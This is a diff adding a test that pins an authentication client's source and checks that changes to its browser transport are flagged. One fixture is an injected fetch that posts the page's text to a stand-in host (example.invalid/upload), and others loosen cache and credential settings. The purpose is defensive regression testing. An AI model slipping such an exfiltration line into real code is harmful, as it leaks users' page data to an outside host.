@@ -80,6 +80,25 @@ describe("#348 fail-closed source inventory", () => {
     expect(transportFingerprintFailure(path, changed)).toBe(`CHANGED_BROWSER_TRANSPORT:${path}`);
   });
 
+  it("pins the cookie-backed #328 login probe without adding upload capabilities", () => {
+    const path = "src/components/account/auth-client.ts";
+    const reviewed = source(path);
+    expect(reviewed).toContain('credentials: "same-origin"');
+    expect(reviewed).toContain('if (path === "/api/auth/session") init.cache = "no-store";');
+    expect(reviewed).toContain('const session = await readSession();');
+    expect(reviewed).toContain('session.data.user.email.toLowerCase() !== expectedEmail.toLowerCase()');
+    expect(reviewed).toContain('return confirmCookieBackedAuth("/api/auth/login"');
+    expect(reviewed).toContain('return confirmCookieBackedAuth("/api/auth/register"');
+    expect(transportFingerprintFailure(path, reviewed)).toBeNull();
+    for (const changed of [
+      reviewed + '\nvoid fetch("https://example.invalid/upload", { method: "POST", body: document.body.textContent });',
+      reviewed.replace('init.cache = "no-store"', 'init.cache = "force-cache"'),
+      reviewed.replace('credentials: "same-origin"', 'credentials: "include"'),
+    ]) {
+      expect(transportFingerprintFailure(path, changed)).toBe(`CHANGED_BROWSER_TRANSPORT:${path}`);
+    }
+  });
+
   it("reviews the #328 logout confirmation without granting any new transport surface", () => {
     const path = "src/components/account/AccountChip.astro";
     const reviewed = source(path);
